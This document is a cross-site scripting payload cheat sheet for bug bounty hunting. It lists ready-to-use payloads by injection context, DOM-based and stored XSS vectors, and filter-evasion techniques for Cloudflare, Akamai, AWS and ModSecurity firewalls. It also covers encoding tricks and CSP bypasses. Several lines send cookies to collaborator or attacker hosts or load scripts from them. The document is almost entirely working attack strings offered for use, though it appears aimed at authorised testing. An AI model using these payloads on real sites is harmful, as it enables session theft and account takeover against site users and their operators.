# XSS Payload Reference

Battle-tested payloads organized by context and bypass technique. Use these as starting points during active hunting -- adapt to the target.

---

## Polyglots

Universal payloads that fire across multiple injection contexts:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik/telerik/oNpointerenter=alert()/telerik/>telerik/telerik/telerik/<sVg/telerik/telerik/oNloAd=alert()//>telerik\x3telerike"telerik>telerik<img/telerik/telerik/onerror=alert()/telerik/src=x>
```

Simplified polyglot (higher success rate in practice):

```
'"></title></style></textarea></script><svg/onload=alert(document.domain)>
```

Short polyglot for tight character limits:

```
"><img src=x onerror=alert(1)>
```

Attribute-breaking polyglot:

```
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
```

---

## By Injection Context

### HTML Body Context

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
```

### Inside HTML Attribute (Quoted)

Break out of attribute, then inject:

```html
" onmouseover=alert(1) x="
' onmouseover=alert(1) x='
" onfocus=alert(1) autofocus x="
" onclick=alert(1) x="
```

Inside `href` or `src` attribute:

```
javascript:alert(1)
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Inside JavaScript String

```javascript
'-alert(1)-'
';alert(1)//
\';alert(1)//
</script><svg onload=alert(1)>
${alert(1)}
```

Template literal injection:

```javascript
${alert(document.domain)}
`+alert(1)+`
```

### Inside JavaScript Comment

```javascript
*/alert(1)/*
*/</script><svg onload=alert(1)>
```

### URL Context (href, src, action)

```
javascript:alert(1)
javascript:alert(document.domain)
//evil.com
\/\/evil.com
```

### Inside `<style>` or CSS Context

```css
</style><svg onload=alert(1)>
expression(alert(1))
```

### Inside `<textarea>` or `<title>`

```html
</textarea><svg onload=alert(1)>
</title><svg onload=alert(1)>
```

---

## DOM-Based XSS

### Common Sources and Sinks

Sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`
Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout`, `setInterval`, `Function()`

### DOM XSS Payloads

Via `location.hash`:

```
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page#javascript:alert(1)
```

Via `window.name`:

```html
<!-- On attacker page -->
<script>
window.name='<img src=x onerror=alert(document.domain)>';
location='https://target.com/vulnerable-page';
</script>
```

Via `postMessage`:

```html
<iframe src="https://target.com/page" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')">
```

Via `document.referrer`:

```html
<!-- Link from attacker page with payload in URL -->
<a href="https://target.com/page?<svg/onload=alert(1)>">click</a>
```

---

## Stored XSS

### Profile/Bio Fields

```html
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(document.cookie)>
"><script>fetch('https://BURP-COLLAB/'+document.cookie)</script>
```

### Markdown-Rendered Fields

```markdown
[Click](javascript:alert(1))
![img](x" onerror="alert(1))
[link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
```

### File Upload Names

```
"><img src=x onerror=alert(1)>.png
<svg onload=alert(1)>.svg
```

### SVG File Upload (serve as image or direct access)

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

## Event Handlers (Comprehensive)

No user interaction required:

```
onload, onerror, onanimationend, onanimationstart, ontransitionend,
onfocus (with autofocus), onblur, onpageshow, onhashchange,
onmessage, ontoggle (with <details open>), onpointerenter
```

Requires user interaction:

```
onclick, onmouseover, onmouseenter, onmousedown, onkeydown,
onkeypress, onkeyup, ondblclick, oncontextmenu, ondrag, ondrop,
oninput, onchange, onsubmit, onpaste, oncopy, oncut, onwheel, onscroll
```

---

## WAF Bypass Techniques

### Cloudflare Bypasses

```html
<svg onload=alert&#40;1&#41;>
<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="j&#x61;vascript:alert(1)">click</a>
<img src=x onerror="window['al'+'ert'](1)">
<svg/onload=self[`al`+`ert`](1)>
<img src=x onerror=top[0x616c657274](1)>
```

### Akamai Bypasses

```html
<img src=x onerror=prompt(1)>
<svg/onload=confirm`1`>
<details/open/ontoggle=alert(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

### AWS WAF Bypasses

```html
<img src=x onerror=alert(1)>  <!-- with mixed case and whitespace -->
<iMg SrC=x OnErRoR=alert(1)>
<img/src=x/onerror=alert(1)>
<svg><script>alert&#40;1&#41;</script></svg>
```

### ModSecurity CRS Bypasses

```html
<svg/onload=alert(1)>  <!-- tag/event fusion -->
<img src=1 onerror=alert(1)>  <!-- with null bytes: src=1%00 -->
<a href=javas&#99;ript:alert(1)>click</a>
```

### Generic WAF Bypasses

Capitalization:

```html
<ScRiPt>alert(1)</ScRiPt>
<ImG sRc=x OnErRoR=alert(1)>
```

No parentheses:

```html
<svg onload=alert`1`>
<img src=x onerror=throw`1`>
<img src=x onerror=alert&lpar;1&rpar;>
```

No angle brackets (inside attribute):

```
" autofocus onfocus=alert(1) "
```

---

## Encoding Tricks

### HTML Entity Encoding

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```

### Hex HTML Entities

```html
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

### Unicode Escapes (inside JS context)

```javascript
\u0061\u006c\u0065\u0072\u0074(1)
```

### URL Encoding

```
%3Csvg%20onload%3Dalert(1)%3E
%22%20onmouseover%3Dalert(1)%20x%3D%22
```

### Double URL Encoding

```
%253Csvg%2520onload%253Dalert(1)%253E
```

### JSFuck / Alternative Alert

```javascript
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]  // Function constructor
self['al'+'ert'](1)
top['al'+'ert'](1)
window['al'+'ert'](1)
self[atob('YWxlcnQ=')](1)
```

---

## CSP Bypass Techniques

### JSONP Endpoints (if whitelisted domain has JSONP)

```html
<script src="https://whitelisted.com/jsonp?callback=alert(1)//"></script>
```

### AngularJS CSP Bypass (if Angular is loaded)

```html
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(1)">click</div>
</div>
```

### `base-uri` Missing

```html
<base href="https://attacker.com/">
<!-- Scripts with relative paths now load from attacker -->
```

### `script-src` with `unsafe-eval`

```html
<img src=x onerror="eval('alert(1)')">
```

### `script-src` with `strict-dynamic`

If you can inject into an already-trusted script:

```javascript
document.createElement('script').src='https://attacker.com/xss.js'
```

### Upload `.js` to Whitelisted Domain

If the CSP whitelists `self` or a CDN where you can upload:

```html
<script src="/uploads/evil.js"></script>
```

---

## Proof of Concept Tips

For bug bounty reports, use these instead of `alert(1)`:

```javascript
alert(document.domain)      // proves execution context
alert(document.cookie)      // proves cookie access (if not HttpOnly)
fetch('https://BURP-COLLAB-ID.oastify.com/'+document.cookie)  // proves exfiltration
```

Blind XSS payload (drop in every input field):

```html
"><script src=https://YOUR-XSS-HUNTER-DOMAIN/probe.js></script>
"><img src=x onerror="fetch('https://YOUR-COLLAB/'+document.domain)">
```
